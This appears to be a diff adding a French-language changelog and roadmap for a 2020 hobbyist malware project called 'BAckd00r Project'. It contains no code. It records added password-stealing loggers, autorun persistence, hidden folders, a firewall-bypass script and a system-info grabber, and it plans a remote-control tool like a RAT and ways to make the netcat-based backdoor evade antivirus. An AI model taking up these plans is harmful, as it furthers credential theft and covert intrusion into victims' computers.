@@ -1,0 +1,31 @@
+[2020]
+--v0.01: Création Du Project (ça buggait beaucoup xd)/09 Mars 
+--v0.02: Ajout de loggers qui prennent les mot de passe et divers fixes/09 Mars
+--v0.03: autre fixes/10 Mars
+--v0.04: ajout d'une commmande permission (en gros sa marche plus facilement)/10 Mars
+--v0.05: fix d'un bug & ajout d'un autorun (a tester car apparament les autorun = mort...)10-11 Mars ?
+______________________________________________________________________________________________________________________
+--------------------------------------------Le projet Reprends--------------------------------------------------------
+--v0.06: Fix du choppeur de mot de passe qui buggait + ajout de dossiers en + pour masquer les fichier - 2 octobre
+--v0.07: réduction du nombre de .bat & optimisations du code - 3 octobre
+--v0.08: ajout d'un script pour bypass le pare-feu + ajout d'un choppeur d'info système & autre optimisation, ajout d'un icon, modif de l'autorun - 4 octobre
+--v0.09: mise a jour des grabber de mot de passe & amélioration (plus besoin de redémarrer le pc), encore - de .bat - 6 octobre
+----------------------------------------------------------------------------------------------------------------------
+______________________________________________________________________________________________________________________
+------[Projects a rajouter pour la backdoor]------
+-Pouvoir backdoorer n'importe quel PC avec la vraie IP, car pour l'instant sa utilise l'ip LOCALE 
+(faut que sa soit un pc qui soit connecté au même réseau que toi pour l'instant)
+-Un localhost pour pouvoir gérer les pc a distance (en gros comme un RAT mais en mieux et moins détéctable)
+_______________________________________________________________________________________________________________________
+--------------------[Choses a faire]-----------------------------------------------------------------------------------
+Rendre indétectable la backdoor car les antivirus l'ont déja cramé, rip netcat ptdr (oui)
+-----------------------------------------------------------------------------------------------------------------------
+_______________________________________________________________________________________________________________________
+-------------------------------------[Infos Prochaines Mises A Jour]---------------------------------------------------
+-----------------------------------------------------------------------------------------------------------------------
+Peut-être que je rajouterais des virus ou autres, je verrais bien plus tard
+-----------------------------------------------------------------------------------------------------------------------
+_______________________________________________________________________________________________________________________
+-----------------------------------------------------------------------------------------------------------------------
+|..................................©MiR, BAckd00r Project - 2020 - discord.gg/R3xDYcM.................................|
+-----------------------------------------------------------------------------------------------------------------------
